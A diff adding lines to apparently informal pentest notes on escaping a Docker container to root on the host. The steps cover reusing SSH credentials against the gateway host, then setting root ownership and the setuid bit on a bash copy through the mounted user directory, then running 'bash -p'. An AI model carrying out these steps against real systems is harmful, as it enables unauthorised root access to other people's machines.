@@ -1,4 +1,25 @@
 You get into a user/admin but you are in a Docker (you can find out by: ls -al and notice that all the files has 1000 privs...that means that we r in a users docker)
 plus with the command "mount" you can be sure that you are in a container with something like this " /dev/sda1 on /home/usersname..."
 
+so you r in a docker shell
+its common that this shell has as broadcast the addre x.x.x.1
 
+for example if you have in docker the 172.19.0.2 then .1 is your host.
+so:
+1) ping 172.19.0.1
+2) if there is ssh for a user: ssh name@ip like: shh john@172.19.0.1
+  try to reuse the creds there
+3)you are in. try the --> ip addr
+now  that you r at host machine you will copy the bash file/program in the user's container (user directory is mounted in the Docker container)
+then you will exit
+4) exit
+and get in docker shell again. Now if you ls -al you will see the bash file.
+5) chown root:root bash
+6) chmod 4755 bash
+7) ls -al bash
+now you have a bash with root priv's
+8) connect to host again: ssh john@IP
+9) and there: ls -al and yo uwill see your bash with root privs
+10) ./bash -p    and spawn a shell with the effective UID of root.
+11) id   ---> euid=0 root
+12) you can cd /root now
